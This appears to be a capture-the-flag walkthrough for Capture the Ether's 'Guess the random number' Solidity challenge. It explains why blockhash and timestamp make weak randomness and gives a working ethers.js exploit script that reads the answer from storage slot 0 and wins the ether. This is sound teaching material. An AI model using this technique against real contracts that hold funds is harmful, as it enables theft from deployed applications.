---
description: >-
  In Capture the Ether's "Guess the random number", we see the first example of
  a "secret number" that can't easily be gleaned from reviewing the contract.
---

# Guess the random number

[This challenge](https://capturetheether.com/challenges/lotteries/guess-the-random-number/) is unique in that it sets the value of its `answer` from a _sort-of-random_ source when it is deployed (via its constructor) and it isn't obvious just in reading the contract what it could be.

### Hints

<details>

<summary>Hint One</summary>

Remember that data stored on the blockchain is publicly accessible, including the value of this contract's `answer` variable. The question is, where do contracts store their state variables and how can you access them pragmatically?

</details>

### Full Walkthrough

There are really two ways to approach at this challenge. Let's look at how the answer is generated in the constructor:

```solidity
function GuessTheRandomNumberChallenge() public payable {
    require(msg.value == 1 ether);
    answer = uint8(keccak256(block.blockhash(block.number - 1), now));
}
```

The sources of "randomness" fed to the `keccak256` function are the block hash of the previous block and the current block timestamp (`now`). Both of these values could be reverse-engineered by looking at the block in which the contract itself was deployed, making them a pretty poor way of generating a "random" value.&#x20;

The other way to look at this problem is by realizing that no matter how random the value of `answer` may be, it is still stored on the blockchain as a state variable for this contract. Specifically, because it is the first state variable declared it lives in the slot indexed 0 of this contract's storage. This means we can easily query the value from the chain, ensuring our "guess" is a very good one.&#x20;

### Scripted Solution

```javascript
const ethers = require('ethers')
const fs = require('fs')
require('dotenv').config({ path: './.env' })

/**
 * Initialize Ethers objects needed to interact with the blockchain and
 * contract.
 */
async function setup(contractName) {
  // Create provider - a read-only abstraction to access blockchain data
  const provider = new ethers.providers.InfuraProvider(process.env.NETWORK)
  // Create player wallet
  const playerWallet = new ethers.Wallet(process.env.PRIVATE_KEY)
  // Create player wallet signer - an abstraction of an Ethereum account
  const playerWalletSigner = await playerWallet.connect(provider)
  // Create contract instance - an abstraction of the deployed contract code
  const contractAbi = fs.readFileSync(`./${contractName}.abi`, 'utf8')
  const contract = new ethers.Contract(
    process.env.CONTRACT_ADDRESS,
    contractAbi,
    playerWalletSigner
  )

  return { provider, playerWallet, playerWalletSigner, contract }
}

/**
 * Run contract exploit.
 */
async function main() {
  // Get Ethers objects needed to interact with the blockchain and contract
  const { provider, contract: guessTheRandomNumberChallengeContract } =
    await setup('GuessTheRandomNumberChallenge')

  // Get `answer` from contract storage slot
  console.log('Getting answer from contract storage...')
  const answerSlot = 0
  const answerDataHexString = await provider.getStorageAt(
    guessTheRandomNumberChallengeContract.address,
    answerSlot
  )
  const answerNumber = Number(ethers.utils.hexValue(answerDataHexString))

  // Guess answer by calling `guess` with 1 ether
  const guessAnswer = await guessTheRandomNumberChallengeContract.guess(
    answerNumber,
    {
      gasPrice: 20000000000,
      value: ethers.utils.parseEther('1.0')
    }
  )
  await guessAnswer.wait(1)

  // Confirm challenge completion
  console.log('Confirming challenge completion...')
  const challengeComplete =
    await guessTheRandomNumberChallengeContract.isComplete()

  if (challengeComplete) {
    console.log('Challenge is complete!')
  }
}

main()
  .then(() => process.exit(0))
  .catch(error => {
    console.error(error)
    process.exit(1)
  })
```
